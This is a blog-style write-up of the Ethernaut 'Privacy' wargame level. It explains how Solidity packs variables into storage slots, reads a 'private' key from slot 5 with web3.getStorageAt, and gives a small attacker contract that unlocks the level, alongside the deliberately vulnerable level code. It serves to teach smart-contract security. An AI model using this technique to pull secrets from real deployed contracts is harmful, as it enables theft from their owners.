+++
title = 'Ethernaut Level 12 - Privacy'
date = 2024-08-04
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Understand how storages work'
tags = [ 'writeups' , 'blockchain' ]
+++
# Privacy
```
The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

    Understanding how storage works
    Understanding how parameter parsing works
    Understanding how casting works

Tips:

    Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.
```
## Understanding how Storage works
> https://enderspub.kubertu.com/understand-solidity-storage-in-depth
Each EVM has a number of storage slots. Each storage slot can store 32 bytes.
* Storage stores variables, not constant
* Smaller variables are stored in the same slot until it would be filled


## Solution
Slots:
0. locked
1. ID
2. flattening, denomination, awkwardness
3. data[0]
4. data[1]
5. data[2] = key
```
await web3.eth.getStorageAt(contract.address, 5)
```
-> `0xf1b341c065a38b34e214b31a8133b46078510230cd7fa607152021ec84aab82f`


```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface Privacy {
    function unlock(bytes16 _key) external ;
}

contract Hack {

    constructor(address _target) {
        Privacy target_contract = Privacy(_target);
        // Secret key
        bytes memory b = abi.encodePacked(hex"f1b341c065a38b34e214b31a8133b46078510230cd7fa607152021ec84aab82f");
        target_contract.unlock(bytes16(b));
    }

}
```

## Level code
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```